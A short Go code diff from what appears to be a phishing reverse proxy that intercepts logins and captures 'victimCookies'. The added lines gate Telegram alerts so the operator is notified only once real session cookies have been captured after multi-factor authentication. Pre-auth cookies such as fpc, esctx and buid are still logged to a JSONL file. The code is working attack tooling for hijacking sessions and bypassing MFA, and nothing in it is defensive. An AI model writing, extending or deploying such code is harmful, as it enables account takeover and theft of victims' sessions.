@@ -236,6 +236,20 @@ func notifyCapture(r *http.Request, reqBody []byte, victimCookies []*http.Cookie
 		"source":      "proxy",
 	})
 
+	// Only notify Telegram if actual session cookies were captured (post-MFA).
+	// Pre-auth cookies (fpc, esctx, buid) logged to JSONL but skip Telegram.
+	hasSession := false
+	for _, c := range capturedCookies {
+		name := strings.SplitN(c, "=", 2)[0]
+		if pl.isSessionCookie(name) {
+			hasSession = true
+			break
+		}
+	}
+	if !hasSession {
+		return
+	}
+
 	if !telegramOk {
 		return
 	}
